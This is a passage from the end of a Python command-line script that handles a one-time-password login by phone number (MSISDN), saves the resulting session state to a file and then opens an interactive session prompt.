    # ---------------- fresh OTP login ----------------------------------------
    msisdn = (args.msisdn or "").strip()
    if not msisdn and args.otp:
        LOG.error("[!] --otp requires a MSISDN when no saved session exists.")
        return
    if not msisdn:
        try:
            msisdn = input("[?] Enter phone number (MSISDN): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
    if not msisdn:
        LOG.error("[!] no MSISDN provided — aborting.")
        return
    try:
        state["_login_msisdn"] = normalize_msisdn(msisdn)
    except ValueError as exc:
        LOG.error("[!] %s — aborting.", exc)
        return
    LOG.info("Input MSISDN : %s  ->  normalized: %s", msisdn, state["_login_msisdn"])

    tokens = run_login_flow(args, state, extra, session)
    if tokens is None:
        LOG.info("=" * 76)
        sys.exit(1)

    save_state(args.state_file, state)          # persist the logged-in state
    if args.otp:
        LOG.info("[i] non-interactive mode: session saved to %s — rerun without "
                 "--otp to resume it.", os.path.abspath(args.state_file))
        maybe_autoopen(session, args, state, extra)
        return
    maybe_autoopen(session, args, state, extra)
    session_shell(args, state, extra, session)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        sys.exit(130)
